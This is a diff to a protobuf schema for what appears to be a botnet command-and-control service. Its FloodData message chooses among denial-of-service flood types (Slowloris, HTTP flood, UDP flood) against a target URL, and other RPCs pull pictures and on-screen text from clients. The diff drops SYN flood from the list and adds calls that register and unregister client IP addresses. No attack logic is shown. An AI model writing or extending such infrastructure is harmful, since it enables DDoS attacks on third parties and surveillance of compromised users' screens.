@@ -24,7 +24,7 @@ message Void {}
 
 message FloodData { 
     bool ShouldFlood = 1;
-    int32 floodType =2; // 0 = Slowloris, 1 = Httpflood, 2 = Synflood, 3 = Updflood
+    int32 floodType =2; // 0 = Slowloris, 1 = Httpflood, 2 = Updflood
     string url = 3;
     int64 limit = 4;
     int64 num_threads = 5;
@@ -65,6 +65,11 @@ message PictureOutput {
     ClientDataRequest id = 2;
 }
 
+message RegisterData {
+    string ip = 1;
+    ClientDataRequest id = 2;
+}
+
 message ClientDataRequest { string client_id = 1; }
 
 message ClientDataOnScreenTextResponse { ClientOnScreenData on_screen = 1; }
@@ -82,4 +87,6 @@ service Consumer {
     rpc SetScreenOutput(ScreenOutput) returns (Void);
     rpc GetPicture(ClientDataRequest) returns (PictureData);
     rpc SetPictureOutput(PictureOutput) returns (Void);
+    rpc RegisterClient(RegisterData) returns (Void);
+    rpc UnregisterClient(RegisterData) returns (Void);
 }
